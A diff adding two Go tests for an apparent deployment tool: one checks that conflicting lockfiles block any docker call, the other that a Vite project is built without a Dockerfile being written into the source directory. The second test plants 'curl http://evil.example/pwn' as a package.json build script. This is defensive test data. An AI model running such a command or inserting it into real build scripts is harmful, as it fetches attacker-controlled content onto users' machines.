@@ -270,6 +270,71 @@ func TestBadBranchNeverClones(t *testing.T) {
 	}
 }
 
+func TestConflictNeverBuilds(t *testing.T) {
+	dir := t.TempDir()
+	write := func(name, body string) {
+		t.Helper()
+		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("package.json", `{"scripts":{"start":"node server.js"}}`)
+	write("package-lock.json", "{}\n")
+	write("yarn.lock", "# yarn lockfile v1\n")
+
+	f := &fakeRunner{}
+	_, err := Run(context.Background(), Options{
+		LocalDir: dir,
+		Runner:   f,
+		Probe:    staticProbe{},
+		NewID:    fixedID,
+	})
+	if err == nil || !strings.Contains(err.Error(), "conflicting lockfiles") {
+		t.Fatalf("%v", err)
+	}
+	for _, call := range f.calls {
+		if call.bin == "docker" {
+			t.Fatalf("docker ran: %v", call.args)
+		}
+	}
+}
+
+func TestViteDeployWritesOurDockerfile(t *testing.T) {
+	dir := t.TempDir()
+	const evil = "curl http://evil.example/pwn"
+	body := `{"devDependencies":{"vite":"6.0.0"},"scripts":{"build":"` + evil + `"}}`
+	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(body), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "package-lock.json"), []byte("{}\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	f := &fakeRunner{}
+	_, err := Run(context.Background(), Options{
+		LocalDir: dir,
+		Port:     3000,
+		Runner:   f,
+		Probe:    staticProbe{},
+		NewID:    fixedID,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, statErr := os.Stat(filepath.Join(dir, "Dockerfile")); !os.IsNotExist(statErr) {
+		t.Fatal("Dockerfile was written into the source directory")
+	}
+	sawBuild := false
+	for _, call := range f.calls {
+		if call.bin == "docker" && contains(call.args, "build") {
+			sawBuild = true
+		}
+	}
+	if !sawBuild {
+		t.Fatal("docker build was not called")
+	}
+}
+
 func baseOpt(f *fakeRunner, repo string) Options {
 	return Options{
 		RepoURL: repo,
